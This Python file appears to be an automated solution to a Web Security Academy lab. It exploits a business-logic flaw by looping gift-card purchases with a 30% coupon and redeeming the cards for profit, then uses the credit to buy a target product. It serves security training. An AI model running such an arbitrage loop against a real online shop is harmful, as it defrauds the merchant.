from web_security_academy.core.logger import logger
from web_security_academy.core.utils import print_info
from bs4 import BeautifulSoup


def solve_lab(session):
    session.login("wiener", "peter")

    # Grab CSRF token from /cart
    data = {"productId": 2, "quantity": 1, "redir": "PRODUCT"}
    session.post_path("/cart", data=data)
    csrf = session.get_csrf_token("/cart")
    data = {"productId": 2, "quantity": -1, "redir": "PRODUCT"}
    session.post_path("/cart", data=data)

    credit = 100
    logger.set_terminator("\r")
    while credit < 1337:
        # Fill cart with $10 gift cards
        quantity = min(credit // 10, 99)
        data = {"productId": 2, "quantity": quantity, "redir": "PRODUCT"}
        session.post_path("/cart", data=data)
        logger.info(f"Credit: ${credit}.00 - Added {quantity} gift cards to cart")

        # Apply 30% off coupon
        data = {"csrf": csrf, "coupon": "SIGNUP30"}
        session.post_path("/cart/coupon", data=data)
        logger.info(f'Credit: ${credit}.00 - Applied "SIGNUP30" coupon')

        # Buy all gift cards
        resp = session.post_path("/cart/checkout", data={"csrf": csrf})
        credit -= quantity * 7
        logger.info(f"Credit: ${credit}.00 - Checked out")

        # Redeem gift cards (making 30% profit)
        soup = BeautifulSoup(resp.text, "html.parser")
        query = soup.select(".is-table-numbers td")
        for i, gift_card in enumerate(query):
            if i >= quantity:
                break
            data = {"csrf": csrf, "gift-card": gift_card.text}
            session.post_path("/gift-card", data=data)
            credit += 10
            logger.info(f"Credit: ${credit}.00 - Redeemed gift card #{i+1}")

    # Buy a Lightweight l33t leather jacket
    data = {"productId": 1, "quantity": 1, "redir": "PRODUCT"}
    session.post_path("/cart", data=data)
    session.post_path("/cart/checkout", data={"csrf": csrf})
    logger.set_terminator("\n")
    logger.info('Bought a "Lightweight l33t leather jacket"')
